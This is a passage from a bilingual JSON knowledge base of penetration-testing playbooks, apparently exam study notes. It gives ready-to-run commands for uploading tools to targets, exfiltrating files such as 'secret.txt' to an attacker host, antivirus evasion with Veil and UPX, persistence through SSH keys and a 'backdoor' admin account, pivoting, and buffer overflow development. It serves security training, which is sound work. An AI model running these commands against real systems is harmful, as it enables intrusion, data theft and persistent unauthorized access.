    "tools": ["python", "wget", "curl", "certutil", "powershell (iwr, WebClient)"],
    "phases": ["Post Exploitation", "Exploitation"],
    "techniques": ["File Transfer"],
    "targets": ["Linux", "Windows"],
    "os": ["Any"],
    "tags": ["file transfer", "upload to target", "http server", "python", "wget", "curl", "certutil", "powershell", "iwr", "webclient"],
    "content": "## Playbook 41: File Transfer - Tải lên Target qua HTTP ⬆️📄\n\n**Giả định:** Có shell, target kết nối được HTTP ra Kali.\n\n**Mục tiêu:** Chuyển file từ Kali lên target.\n\n**Các bước thực hiện:**\n\n1.  **Server (Kali):** `python3 -m http.server 80`.\n2.  **Tải về (Target Linux):** `wget http://<kali_ip>/file -O /tmp/file` hoặc `curl http://<kali_ip>/file -o /tmp/file`.\n3.  **Tải về (Target Windows):** `iwr ... -Outfile C:\\Temp\\file` hoặc `certutil ... C:\\Temp\\file`.",
    "steps": [
      { "vi": "**Chạy HTTP Server (Kali):**", "en": "**Run HTTP Server (Kali):**", "command": "python3 -m http.server 80" },
      { "vi": "**Tải về Target (Linux - wget):**", "en": "**Download on Target (Linux - wget):**", "command": "wget http://<kali_ip>/linpeas.sh -O /tmp/linpeas.sh" },
      { "vi": "**Tải về Target (Linux - curl):**", "en": "**Download on Target (Linux - curl):**", "command": "curl http://<kali_ip>/linpeas.sh -o /tmp/linpeas.sh" },
      { "vi": "**Tải về Target (Windows - iwr):**", "en": "**Download on Target (Windows - iwr):**", "command": "iwr -uri http://<kali_ip>/winPEASx64.exe -Outfile C:\\Windows\\Temp\\winPEASx64.exe" },
      { "vi": "**Tải về Target (Windows - certutil):**", "en": "**Download on Target (Windows - certutil):**", "command": "certutil -urlcache -split -f http://<kali_ip>/winPEASx64.exe C:\\Windows\\Temp\\winPEASx64.exe" }
    ],
    "related_knowledge_ids": ["file_transfer_http_upload", "python", "wget", "curl", "certutil", "powershell", "iwr", "webclient", "file_transfer_download_linux", "file_transfer_download_windows"]
  },
  "playbook_42_file_transfer_smb_upload": {
    "title": {
      "vi": "Playbook 42: File Transfer - Tải File lên Target qua SMB Server",
      "en": "Playbook 42: File Transfer - Uploading Files to Target via SMB Server"
    },
    "assumption": "Có shell trên máy target Windows. Target có thể kết nối SMB ra máy Kali.",
    "objective": "Chuyển file từ Kali lên máy target Windows bằng SMB.",
    "tools": ["impacket-smbserver", "copy", "powershell (iwr)"],
    "phases": ["Post Exploitation", "Exploitation"],
    "techniques": ["File Transfer"],
    "targets": ["Windows"],
    "os": ["Windows", "Linux (Kali for server)"],
    "tags": ["file transfer", "upload to target", "smb server", "impacket-smbserver", "windows", "copy", "iwr", "unc path"],
    "content": "## Playbook 42: File Transfer - Tải lên Target qua SMB ⬆️📄\n\n**Giả định:** Có shell Windows, target kết nối được SMB ra Kali.\n\n**Mục tiêu:** Chuyển file từ Kali lên target bằng SMB.\n\n**Các bước thực hiện:**\n\n1.  **Server (Kali):** `sudo impacket-smbserver -smb2support SHARE .`.\n2.  **Tải về (Target Windows - copy):** `copy \\\\KALI_IP\\SHARE\\file C:\\Temp\\file`.\n3.  **Tải về (Target Windows - iwr):** `iwr -uri \\\\KALI_IP\\SHARE\\file -Outfile C:\\Temp\\file`.",
    "steps": [
      { "vi": "**Chạy SMB Server (Kali):**", "en": "**Run SMB Server (Kali):**", "command": "sudo impacket-smbserver -smb2support SHARE ." },
      { "vi": "**Tải về Target (Windows - copy):**", "en": "**Download on Target (Windows - copy):**", "command": "copy \\\\KALI_IP\\SHARE\\winPEASx64.exe C:\\Windows\\Temp\\winPEASx64.exe" },
      { "vi": "**Tải về Target (Windows - iwr):**", "en": "**Download on Target (Windows - iwr):**", "command": "iwr -uri \\\\KALI_IP\\SHARE\\winPEASx64.exe -Outfile C:\\Windows\\Temp\\winPEASx64.exe" }
    ],
    "related_knowledge_ids": ["file_transfer_smb_upload", "impacket-smbserver", "copy", "iwr", "unc_path", "certutil"]
  },
  "playbook_43_file_transfer_http_download": {
    "title": {
      "vi": "Playbook 43: File Transfer - Tải File từ Target về Kali qua HTTP Upload Server",
      "en": "Playbook 43: File Transfer - Downloading Files from Target via HTTP Upload Server"
    },
    "assumption": "Có shell trên máy target (Linux/Windows). Target có thể kết nối HTTP ra máy Kali.",
    "objective": "Chuyển file từ target về Kali.",
    "tools": ["python (SimpleHTTPServerWithUpload.py)", "curl", "powershell (WebClient)"],
    "phases": ["Post Exploitation"],
    "techniques": ["File Transfer", "Exfiltration"],
    "targets": ["Linux", "Windows"],
    "os": ["Any"],
    "tags": ["file transfer", "download from target", "exfiltration", "http server", "python", "upload", "curl", "webclient"],
    "content": "## Playbook 43: File Transfer - Tải về Kali qua HTTP Upload ⬇️📄\n\n**Giả định:** Có shell, target kết nối được HTTP ra Kali.\n\n**Mục tiêu:** Chuyển file từ target về Kali.\n\n**Các bước thực hiện:**\n\n1.  **Server (Kali):** `python3 SimpleHTTPServerWithUpload.py 8000`.\n2.  **Upload (Target Linux):** `curl -F 'file=@/path/file' http://<kali_ip>:8000`.\n3.  **Upload (Target Windows):** `(New-Object Net.WebClient).UploadFile('http://<kali_ip>:8000', 'C:\\path\\file')`.",
    "steps": [
      { "vi": "**Chạy HTTP Upload Server (Kali):**", "en": "**Run HTTP Upload Server (Kali):**", "command": "python3 SimpleHTTPServerWithUpload.py 8000" },
      { "vi": "**Upload từ Target (Linux - curl):**", "en": "**Upload from Target (Linux - curl):**", "command": "curl -F 'file=@/path/to/secret.txt' http://<kali_ip>:8000" },
      { "vi": "**Upload từ Target (Windows - PS):**", "en": "**Upload from Target (Windows - PS):**", "command": "(New-Object System.Net.WebClient).UploadFile('http://<kali_ip>:8000', 'C:\\path\\to\\secret.txt')" }
    ],
    "related_knowledge_ids": ["file_transfer_http_download", "python", "upload", "curl", "webclient"]
  },
  "playbook_44_file_transfer_smb_download": {
    "title": {
      "vi": "Playbook 44: File Transfer - Tải File từ Target về Kali qua SMB Server",
      "en": "Playbook 44: File Transfer - Downloading Files from Target via SMB Server"
    },
    "assumption": "Có shell trên máy target Windows. Target có thể kết nối SMB ra máy Kali.",
    "objective": "Chuyển file từ target Windows về Kali bằng SMB.",
    "tools": ["impacket-smbserver", "copy"],
    "phases": ["Post Exploitation"],
    "techniques": ["File Transfer", "Exfiltration"],
    "targets": ["Windows"],
    "os": ["Windows", "Linux (Kali for server)"],
    "tags": ["file transfer", "download from target", "exfiltration", "smb server", "impacket-smbserver", "windows", "copy", "unc path"],
    "content": "## Playbook 44: File Transfer - Tải về Kali qua SMB ⬇️📄\n\n**Giả định:** Có shell Windows, target kết nối được SMB ra Kali.\n\n**Mục tiêu:** Chuyển file từ target về Kali bằng SMB.\n\n**Các bước thực hiện:**\n\n1.  **Server (Kali):** `sudo impacket-smbserver -smb2support SHARE .`.\n2.  **Upload (Target Windows):** `copy C:\\path\\file \\\\KALI_IP\\SHARE\\file`.",
    "steps": [
      { "vi": "**Chạy SMB Server (Kali):**", "en": "**Run SMB Server (Kali):**", "command": "sudo impacket-smbserver -smb2support SHARE ." },
      { "vi": "**Upload từ Target (Windows - copy):**", "en": "**Upload from Target (Windows - copy):**", "command": "copy C:\\path\\to\\secret.txt \\\\KALI_IP\\SHARE\\secret.txt" }
    ],
    "related_knowledge_ids": ["file_transfer_smb_download", "impacket-smbserver", "copy", "unc_path"]
  },
  "playbook_45_fix_exploit_web_searchsploit": {
    "title": {
      "vi": "Playbook 45: Sửa lỗi Exploit Web (Dùng Searchsploit)",
      "en": "Playbook 45: Fixing Web Exploits (Using Searchsploit)"
    },
    "assumption": "Đã xác định được ứng dụng web và phiên bản. `searchsploit` tìm thấy exploit script.",
    "objective": "Sao chép, phân tích và sửa đổi exploit script từ Searchsploit để hoạt động.",
    "tools": ["searchsploit", "python", "php", "perl", "curl", "text editor"],
    "phases": ["Exploitation"],
    "techniques": ["Exploit Modification", "Web Exploitation"],
    "targets": ["Web Application", "CMS"],
    "os": ["Any"],
    "tags": ["exploit", "fixing exploits", "web exploit", "searchsploit", "exploit modification", "python", "php"],
    "content": "## Playbook 45: Sửa lỗi Exploit Web (Dùng Searchsploit) 🔧🌐➡️💥\n\n**Giả định:** Tìm thấy exploit script trên `searchsploit`.\n\n**Mục tiêu:** Sửa đổi và chạy thành công exploit.\n\n**Các bước thực hiện:**\n\n1.  **Tìm & Sao chép:** `searchsploit <App> <Ver>`, `searchsploit -m <id>`.\n2.  **Đọc & Hiểu:** Mở script, hiểu lỗ hổng, tham số, hành động.\n3.  **Sửa đổi:** Chỉnh URL, LHOST, LPORT, payload, đường dẫn.\n4.  **Chuẩn bị:** Cài thư viện (`pip`), mở listener (`nc`).\n5.  **Chạy Exploit:** `python exploit.py`.\n6.  **Gỡ lỗi:** Đọc lỗi, thêm `print`, so sánh request.",
    "steps": [
      { "vi": "**Tìm Exploit:**", "en": "**Find Exploit:**", "command": "searchsploit <Application Name> <Version>" },
      { "vi": "**Sao chép Exploit:**", "en": "**Mirror Exploit:**", "command": "searchsploit -m <exploit_id.py>" },
      { "vi": "**Sửa đổi Exploit:**", "en": "**Modify Exploit:**", "command": "# Edit script: target_url, lhost, lport, payload, paths" },
      { "vi": "**Mở Listener (Nếu cần):**", "en": "**Start Listener (If needed):**", "command": "rlwrap nc -lvnp 4444" },
      { "vi": "**Chạy Exploit:**", "en": "**Run Exploit:**", "command": "python exploit_id.py" }
    ],
    "related_knowledge_ids": ["fix_exploit_web_searchsploit", "searchsploit", "exploitation_finding_exploits_searchsploit", "python", "php", "perl", "curl", "nc"]
  },
  "playbook_46_av_evasion_veil": {
    "title": {
      "vi": "Playbook 46: AV Evasion dùng Veil",
      "en": "Playbook 46: AV Evasion using Veil"
    },
    "assumption": "Cần tạo payload bypass AV trên Windows.",
    "objective": "Sử dụng Veil Framework để tạo payload tùy chỉnh bypass AV.",
    "tools": ["veil", "msfconsole", "nc"],
    "phases": ["Exploitation", "Defense Evasion"],
    "techniques": ["AV Evasion", "Payload Generation", "Obfuscation"],
    "targets": ["Antivirus", "Windows"],
    "os": ["Windows", "Linux (Kali for generation)"],
    "tags": ["av evasion", "veil", "payload generation", "obfuscation", "bypass", "antivirus", "windows", "meterpreter", "reverse shell"],
    "content": "## Playbook 46: AV Evasion dùng Veil 🛡️➡️🎭➡️🐚\n\n**Giả định:** Cần payload bypass AV.\n\n**Mục tiêu:** Tạo payload bypass AV bằng Veil.\n\n**Các bước thực hiện:**\n\n1.  **Cài & Chạy Veil (Kali):** `sudo apt install veil`, `/usr/share/veil/config/setup.sh`, `sudo veil`.\n2.  **Veil Evasion:** `use Evasion`, `list`, chọn payload (vd: `python/meterpreter/rev_tcp.py`), `set LHOST/LPORT`, `generate`.\n3.  **Chuyển Payload:** Tải file lên target.\n4.  **Mở Listener (MSF):** `use multi/handler`, `set PAYLOAD ...`, `run`.\n5.  **Thực thi Payload (Target).**",
    "steps": [
      { "vi": "**Chạy Veil (Kali):**", "en": "**Run Veil (Kali):**", "command": "sudo veil" },
      { "vi": "**Trong Veil Evasion:**", "en": "**Inside Veil Evasion:**", "command": "use Evasion -> list -> use <payload> -> set LHOST <kali_ip> -> set LPORT [PORT] -> generate" },
      { "vi": "**Mở Listener (Meterpreter):**", "en": "**Start Listener (Meterpreter):**", "command": "msfconsole -qx \"use multi/handler; set PAYLOAD <chosen_payload>; set LHOST <kali_ip>; set LPORT [PORT]; run\"" },
      { "vi": "**Chuyển & Thực thi Payload (Windows):**", "en": "**Transfer & Execute Payload (Windows):**", "command": "# Transfer and run the generated payload" }
    ],
    "related_knowledge_ids": ["av_evasion_lab_capstone03_veil", "veil", "payload_generation", "obfuscation", "msfconsole", "multi_handler", "meterpreter", "reverse_shell", "file_transfer_http_upload"]
  },
  "playbook_47_postex_linux_persistence_sshkey": {
    "title": {
      "vi": "Playbook 47: Linux Post-Exploitation - Persistence qua SSH Key",
      "en": "Playbook 47: Linux Post-Exploitation - Persistence via SSH Key"
    },
    "assumption": "Đã có quyền root hoặc quyền ghi vào `~/.ssh` của target user.",
    "objective": "Thêm public key SSH vào `authorized_keys` để đăng nhập không cần mật khẩu.",
    "tools": ["ssh-keygen", "echo", "mkdir", "chmod", "cat"],
    "phases": ["Post Exploitation", "Persistence"],
    "techniques": ["Persistence", "SSH Key Authentication"],
    "targets": ["Linux User Account", "~/.ssh/authorized_keys"],
    "os": ["Linux"],
    "tags": ["linux", "post exploitation", "persistence", "ssh key", "authorized_keys", "ssh-keygen", "chmod"],
    "content": "## Playbook 47: Linux Post-Ex - Persistence qua SSH Key 📌🔑\n\n**Giả định:** Có quyền root hoặc ghi vào `~/.ssh`.\n\n**Mục tiêu:** Thêm public key để SSH không cần pass.\n\n**Các bước thực hiện:**\n\n1.  **Lấy Public Key (Kali):** `cat ~/.ssh/id_rsa.pub`.\n2.  **Thêm Key (Target):** `mkdir -p ~/.ssh; chmod 700 ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys; chmod 600 ~/.ssh/authorized_keys`.\n3.  **Kiểm tra Đăng nhập (Kali):** `ssh -i ~/.ssh/id_rsa user@<target_ip>`.",
    "steps": [
      { "vi": "**Lấy Public Key (Kali):**", "en": "**Get Public Key (Kali):**", "command": "cat ~/.ssh/id_rsa.pub" },
      { "vi": "**Tạo thư mục .ssh (Target):**", "en": "**Create .ssh dir (Target):**", "command": "mkdir -p /home/<target_user>/.ssh; chmod 700 /home/<target_user>/.ssh" },
      { "vi": "**Thêm Key (Target):**", "en": "**Add Key (Target):**", "command": "echo \"<public_key_string>\" >> /home/<target_user>/.ssh/authorized_keys" },
      { "vi": "**Đặt Quyền (Target):**", "en": "**Set Permissions (Target):**", "command": "chmod 600 /home/<target_user>/.ssh/authorized_keys" },
      { "vi": "**Kiểm tra Đăng nhập (Kali):**", "en": "**Test Login (Kali):**", "command": "ssh -i ~/.ssh/id_rsa <target_user>@<target_ip>" }
    ],
    "related_knowledge_ids": ["add_ssh_public_key", "ssh-keygen", "echo", "mkdir", "chmod", "cat", "ssh"]
  },
  "playbook_48_windows_postex_add_user": {
    "title": {
      "vi": "Playbook 48: Windows Post-Exploitation - Persistence qua Thêm User",
      "en": "Playbook 48: Windows Post-Exploitation - Persistence via Add User"
    },
    "assumption": "Đã có quyền Administrator hoặc SYSTEM.",
    "objective": "Tạo user mới với quyền admin (và RDP) để duy trì truy cập.",
    "tools": ["net user", "net localgroup"],
    "phases": ["Post Exploitation", "Persistence"],
    "techniques": ["Persistence", "User Creation"],
    "targets": ["Windows Local Accounts"],
    "os": ["Windows"],
    "tags": ["windows", "post exploitation", "persistence", "add user", "net user", "net localgroup", "administrator", "rdp"],
    "content": "## Playbook 48: Windows Post-Ex - Persistence qua Thêm User 📌👤\n\n**Giả định:** Có quyền Admin/SYSTEM.\n\n**Mục tiêu:** Tạo user mới với quyền Admin/RDP.\n\n**Các bước thực hiện:**\n\n1.  **Thêm User:** `net user <User> <Pass> /add`.\n2.  **Thêm vào Admin Group:** `net localgroup Administrators <User> /add`.\n3.  **Thêm vào RDP Group:** `net localgroup \"Remote Desktop Users\" <User> /add`.\n4.  **Kiểm tra:** `net user <User>`.",
    "steps": [
      { "vi": "**Thêm User:**", "en": "**Add User:**", "command": "net user backdoor Passw0rd123! /add" },
      { "vi": "**Thêm vào Admin Group:**", "en": "**Add to Admin Group:**", "command": "net localgroup Administrators backdoor /add" },
      { "vi": "**Thêm vào RDP Group:**", "en": "**Add to RDP Group:**", "command": "net localgroup \"Remote Desktop Users\" backdoor /add" },
      { "vi": "**Kiểm tra User:**", "en": "**Check User:**", "command": "net user backdoor" }
    ],
    "related_knowledge_ids": ["add_user_windows", "net user", "net localgroup"]
  },
  "playbook_49_pivoting_ligolo": {
    "title": {
      "vi": "Playbook 49: Pivoting - Tunneling với Ligolo-ng",
      "en": "Playbook 49: Pivoting - Tunneling with Ligolo-ng"
    },
    "assumption": "Có shell trên Box A (Pivot). Cần truy cập mạng nội bộ của Box A.",
    "objective": "Thiết lập TUN interface giữa Kali và Box A bằng Ligolo-ng.",
    "tools": ["ligolo-ng (proxy, agent)", "ip"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Tunneling", "TUN Interface", "Routing"],
    "targets": ["Internal Network Subnet"],
    "os": ["Any"],
    "tags": ["pivoting", "ligolo-ng", "tunneling", "tun interface", "routing"],
    "content": "## Playbook 49: Pivoting - Tunneling với Ligolo-ng 🚶‍♂️🚇➡️🌍\n\n**Giả định:** Có shell trên Box A (Pivot), cần truy cập mạng nội bộ.\n\n**Mục tiêu:** Tạo tunnel mạng bằng Ligolo-ng.\n\n**Các bước thực hiện:**\n\n1.  **Kali:** Tạo TUN (`ip tuntap add ...`), chạy proxy (`./proxy -selfcert`).\n2.  **Target:** Tải & chạy agent (`./agent -connect <kali_ip>:11601 -ignore-cert`).\n3.  **Kali (Console):** `session`, `use <id>`, `start`.\n4.  **Kali (Shell):** Thêm route (`sudo ip route add <subnet> dev ligolo`).\n5.  **Sử dụng Tunnel:** `ping`, `nmap` vào IP nội bộ.",
    "steps": [
      { "vi": "**Tạo TUN Interface (Kali):**", "en": "**Create TUN Interface (Kali):**", "command": "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up" },
      { "vi": "**Chạy Ligolo Proxy (Kali):**", "en": "**Run Ligolo Proxy (Kali):**", "command": "./proxy -selfcert" },
      { "vi": "**Chạy Ligolo Agent (Pivot):**", "en": "**Run Ligolo Agent (Pivot):**", "command": "./agent -connect <kali_ip>:11601 -ignore-cert" },
      { "vi": "**Kết nối & Bắt đầu Session (Ligolo Console):**", "en": "**Connect & Start Session (Ligolo Console):**", "command": "session -> use <id> -> start" },
      { "vi": "**Thêm Route (Kali Shell):**", "en": "**Add Route (Kali Shell):**", "command": "sudo ip route add <Internal_Subnet> dev ligolo" },
      { "vi": "**Kiểm tra Kết nối:**", "en": "**Test Connection:**", "command": "ping <Internal_Target_IP>" }
    ],
    "related_knowledge_ids": ["ligolo_ng_pivoting", "ip", "ping", "nmap"]
  },
  "playbook_50_metasploit_pivoting_autoroute": {
    "title": {
      "vi": "Playbook 50: Pivoting - Metasploit Autoroute & Socks Proxy",
      "en": "Playbook 50: Pivoting - Metasploit Autoroute & Socks Proxy"
    },
    "assumption": "Có session Meterpreter trên Box A (Pivot) trong Metasploit.",
    "objective": "Sử dụng Meterpreter và Metasploit để định tuyến vào mạng nội bộ và/hoặc tạo SOCKS proxy.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Pivoting", "Routing", "SOCKS Proxy"],
    "targets": ["Internal Network Subnet"],
    "os": ["Any"],
    "tags": ["pivoting", "metasploit", "meterpreter", "autoroute", "socks proxy", "routing"],
    "content": "## Playbook 50: Pivoting - Metasploit Autoroute & Socks Proxy 🚶‍♂️🚇➡️🌍 (MSF)\n\n**Giả định:** Có session Meterpreter trên Pivot.\n\n**Mục tiêu:** Định tuyến traffic qua Meterpreter.\n\n**Các bước thực hiện:**\n\n1.  **Kiểm tra Mạng (Meterpreter):** `ipconfig`, `run autoroute -p`.\n2.  **Thêm Route (Meterpreter):** `run autoroute -s <subnet>`.\n3.  **(Tùy chọn) SOCKS Proxy (MSF):** `use auxiliary/server/socks_proxy`, `set SRVPORT 9050`, `run -j`.\n4.  **Sử dụng Pivot:** Chạy module MSF nhắm vào IP nội bộ (qua autoroute) hoặc dùng `proxychains` (qua SOCKS).",
    "steps": [
      { "vi": "**Kiểm tra Mạng (Meterpreter):**", "en": "**Check Network (Meterpreter):**", "command": "ipconfig" },
      { "vi": "**Thêm Route (Meterpreter):**", "en": "**Add Route (Meterpreter):**", "command": "run autoroute -s <Internal_Subnet>" },
      { "vi": "**Chạy Module qua Route (MSF):**", "en": "**Run Module via Route (MSF):**", "command": "use auxiliary/scanner/portscan/tcp; set RHOSTS <Internal_IP>; run" },
      { "vi": "**Tạo SOCKS Proxy (MSF):**", "en": "**Create SOCKS Proxy (MSF):**", "command": "use auxiliary/server/socks_proxy; set SRVPORT 9050; run -j" },
      { "vi": "**Dùng SOCKS Proxy (Kali + Proxychains):**", "en": "**Use SOCKS Proxy (Kali + Proxychains):**", "command": "proxychains nmap -sT -p 80 -Pn <Internal_IP>" }
    ],
    "related_knowledge_ids": ["metasploit_pivoting", "metasploit", "meterpreter", "autoroute", "socks_proxy", "ipconfig", "nmap", "proxychains"]
  },
  "playbook_51_metasploit_portfwd": {
    "title": {
      "vi": "Playbook 51: Pivoting - Metasploit Meterpreter Port Forwarding",
      "en": "Playbook 51: Pivoting - Metasploit Meterpreter Port Forwarding"
    },
    "assumption": "Có session Meterpreter trên Box A (Pivot). Cần truy cập cổng cụ thể trên Box B từ Kali.",
    "objective": "Sử dụng lệnh `portfwd` của Meterpreter để chuyển tiếp cổng.",
    "tools": ["metasploit", "meterpreter"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Pivoting", "Port Forwarding"],
    "targets": ["Internal Network Service"],
    "os": ["Any"],
    "tags": ["pivoting", "metasploit", "meterpreter", "portfwd", "port forwarding"],
    "content": "## Playbook 51: Pivoting - Metasploit Port Forwarding 🚶‍♂️🔗➡️🎯 (MSF)\n\n**Giả định:** Có session Meterpreter, cần truy cập `[Box_B_IP]:[Target_Port]` từ Kali.\n\n**Mục tiêu:** Forward cổng target ra Kali bằng `portfwd`.\n\n**Các bước thực hiện:**\n\n1.  **Thiết lập (Meterpreter):** `portfwd add -l [Listen_Port_Kali] -p [Target_Port] -r [Box_B_IP]`.\n2.  **Truy cập (Kali):** Kết nối đến `127.0.0.1:[Listen_Port_Kali]`.\n3.  **Xóa (Meterpreter):** `portfwd delete ...`.",
    "steps": [
      { "vi": "**Thêm Port Forward (Meterpreter):**", "en": "**Add Port Forward (Meterpreter):**", "command": "portfwd add -l [Listen_Port_Kali] -p [Target_Port] -r [Box_B_IP]" },
      { "vi": "**Xem Port Forwards (Meterpreter):**", "en": "**List Port Forwards (Meterpreter):**", "command": "portfwd list" },
      { "vi": "**Truy cập từ Kali (Ví dụ RDP):**", "en": "**Access from Kali (Example RDP):**", "command": "xfreerdp /v:127.0.0.1:[Listen_Port_Kali] /u:user /p:pass" },
      { "vi": "**Xóa Port Forward (Meterpreter):**", "en": "**Delete Port Forward (Meterpreter):**", "command": "portfwd delete -l [Listen_Port_Kali] -p [Target_Port] -r [Box_B_IP]" }
    ],
    "related_knowledge_ids": ["metasploit_pivoting", "metasploit", "meterpreter", "portfwd", "xfreerdp", "connect_rdp_xfreerdp"]
  },
  "playbook_52_av_evasion_packers": {
    "title": {
      "vi": "Playbook 52: AV Evasion dùng Packers (UPX)",
      "en": "Playbook 52: AV Evasion using Packers (UPX)"
    },
    "assumption": "Có payload .exe bị AV phát hiện.",
    "objective": "Sử dụng UPX để nén/đóng gói file nhằm bypass AV.",
    "tools": ["upx"],
    "phases": ["Defense Evasion"],
    "techniques": ["AV Evasion", "Packing"],
    "targets": ["Antivirus", "Windows Executable (PE)"],
    "os": ["Windows", "Linux (Kali for packing)"],
    "tags": ["av evasion", "packing", "upx", "bypass", "antivirus"],
    "content": "## Playbook 52: AV Evasion dùng Packers (UPX) 🛡️📦➡️🐚\n\n**Giả định:** Payload `.exe` gốc bị AV chặn.\n\n**Mục tiêu:** Dùng UPX nén file để bypass AV.\n\n**Các bước thực hiện:**\n\n1.  **Cài UPX (Kali):** `sudo apt install upx-ucl -y`.\n2.  **Đóng gói:** `upx -9 -o packed.exe original.exe`.\n3.  **Kiểm tra (Tùy chọn):** VirusTotal.\n4.  **Chuyển & Thực thi.**",
    "steps": [
      { "vi": "**Cài UPX (Kali):**", "en": "**Install UPX (Kali):**", "command": "sudo apt install upx-ucl -y" },
      { "vi": "**Đóng gói Payload:**", "en": "**Pack Payload:**", "command": "upx -9 -o packed_payload.exe original_payload.exe" },
      { "vi": "**Chuyển và Thực thi:**", "en": "**Transfer and Execute:**", "command": "# Transfer packed_payload.exe to target and run" }
    ],
    "related_knowledge_ids": ["av_evasion", "upx", "packing"]
  },
  "playbook_53_exploit_buffer_overflow_fix_badchars": {
    "title": {
      "vi": "Playbook 53: Exploit BOF - Tìm và Xử lý Bad Characters",
      "en": "Playbook 53: Exploit BOF - Finding and Handling Bad Characters"
    },
    "assumption": "Đang exploit BOF, đã có EIP offset.",
    "objective": "Xác định các byte (bad chars) làm hỏng payload và loại bỏ chúng.",
    "tools": ["python", "immunity debugger", "mona.py"],
    "phases": ["Exploitation", "Exploit Development"],
    "techniques": ["Buffer Overflow", "Bad Character Analysis"],
    "targets": ["Windows Application (32-bit)"],
    "os": ["Windows"],
    "tags": ["buffer overflow", "bof", "exploit dev", "bad characters", "immunity debugger", "mona"],
    "content": "## Playbook 53: Exploit BOF - Tìm và Xử lý Bad Chars 💥🚫➡️✔️\n\n**Giả định:** Đang exploit BOF, đã có EIP offset.\n\n**Mục tiêu:** Xác định và loại bỏ bad characters.\n\n**Các bước thực hiện:**\n\n1.  **Tạo Chuỗi Bad Chars (Python):** `\\x01` đến `\\xff` (bỏ `\\x00`).\n2.  **Gửi Payload Test:** `Junk + EIP(BBBB) + bad_chars`.\n3.  **Phân tích ESP Dump (Immunity):** Follow ESP, tìm byte bị thiếu/sai.\n4.  **Lặp lại:** Loại bỏ bad char, gửi lại, phân tích lại.\n5.  **Ghi lại Bad Chars:** Ví dụ: `\\x00\\x0A\\x0D\\x2F`.\n6.  **Sử dụng trong Msfvenom:** `msfvenom ... -b '\\x00\\x0a...'`.",
    "steps": [
      { "vi": "**Tạo Chuỗi Bad Chars:**", "en": "**Generate Bad Chars String:**", "command": "# Python loop from \\x01 to \\xff" },
      { "vi": "**Gửi Payload Test:**", "en": "**Send Test Payload:**", "command": "# Python: junk + EIP + bad_chars_string" },
      { "vi": "**Phân tích ESP Dump (Immunity):**", "en": "**Analyze ESP Dump (Immunity):**", "command": "# Right-click ESP -> Follow in Dump. Look for missing/changed bytes." },
      { "vi": "**Lặp lại Loại bỏ Bad Chars:**", "en": "**Repeat Removing Bad Chars:**", "command": "# Remove identified bad char, resend, re-analyze." },
      { "vi": "**Ghi lại Bad Chars:**", "en": "**Record Bad Chars:**", "command": "# Example: \\x00\\x0a\\x0d\\x2f" },
      { "vi": "**Sử dụng trong Msfvenom:**", "en": "**Use in Msfvenom:**", "command": "msfvenom ... -b '\\x00\\x0a\\x0d\\x2f'" }
    ],
    "related_knowledge_ids": ["buffer_overflow", "msfvenom", "python"]
  },
  "playbook_54_exploit_buffer_overflow_find_jmp_esp": {
    "title": {
      "vi": "Playbook 54: Exploit BOF - Tìm JMP ESP (Mona)",
      "en": "Playbook 54: Exploit BOF - Finding JMP ESP (Mona)"
    },
    "assumption": "Đang exploit BOF, đã có offset và bad chars.",
    "objective": "Tìm địa chỉ `JMP ESP` trong module không có ASLR/DEP.",
    "tools": ["immunity debugger", "mona.py"],
    "phases": ["Exploitation", "Exploit Development"],
    "techniques": ["Buffer Overflow", "JMP ESP", "ASLR Bypass (Partial)", "DEP Bypass (Partial)"],
    "targets": ["Windows Application (32-bit)", "DLL Modules"],
    "os": ["Windows"],
    "tags": ["buffer overflow", "bof", "exploit dev", "jmp esp", "immunity debugger", "mona", "aslr", "dep"],
    "content": "## Playbook 54: Exploit BOF - Tìm JMP ESP 💥➡️🦘\n\n**Giả định:** Đang exploit BOF, đã có offset và bad chars.\n\n**Mục tiêu:** Tìm địa chỉ `JMP ESP` đáng tin cậy.\n\n**Các bước thực hiện:**\n\n1.  **Liệt kê Modules (Mona):** `!mona modules`. Tìm module có ASLR/DEP = False.\n2.  **Tìm JMP ESP (Mona):** `!mona find -s \"\\xff\\xe4\" -m <module.dll>`.\n3.  **Chọn Địa chỉ:** Chọn địa chỉ không chứa bad chars.\n4.  **Chuyển Little-Endian:** `0x1001B1C7` -> `\\xC7\\xB1\\x01\\x10`.\n5.  **Sử dụng:** Ghi đè EIP bằng địa chỉ Little-Endian này.",
    "steps": [
      { "vi": "**Liệt kê Modules (Mona):**", "en": "**List Modules (Mona):**", "command": "!mona modules" },
      { "vi": "**Tìm JMP ESP trong Module:**", "en": "**Find JMP ESP in Module:**", "command": "!mona find -s \"\\xff\\xe4\" -m <module_name.dll>" },
      { "vi": "**Chọn Địa chỉ (Tránh Bad Chars):**", "en": "**Choose Address (Avoid Bad Chars):**", "command": "# Select an address from the results" },
      { "vi": "**Chuyển sang Little-Endian:**", "en": "**Convert to Little-Endian:**", "command": "# Example: 0x1001B1C7 -> \\xC7\\xB1\\x01\\x10" }
    ],
    "related_knowledge_ids": ["buffer_overflow", "mona.py", "jmp_esp", "aslr", "dep"]
  },
  "playbook_55_pivoting_sshuttle": {
    "title": {
      "vi": "Playbook 55: Pivoting - VPN \"Nghèo\" với sshuttle",
      "en": "Playbook 55: Pivoting - \"Poor Man's\" VPN with sshuttle"
    },
    "assumption": "Có root shell trên Linux Box A (Pivot), Box A có Python3, có thể SSH từ Kali vào Box A.",
    "objective": "Thiết lập tunnel giống VPN bằng sshuttle để định tuyến từ Kali vào mạng nội bộ của Box A.",
    "tools": ["sshuttle", "ssh", "nmap"],
    "phases": ["Pivoting", "Post Exploitation"],
    "techniques": ["Tunneling", "VPN", "Routing"],
    "targets": ["Internal Network Subnet"],
    "os": ["Linux"],
    "tags": ["pivoting", "sshuttle", "vpn", "tunneling", "routing", "ssh", "python3"],
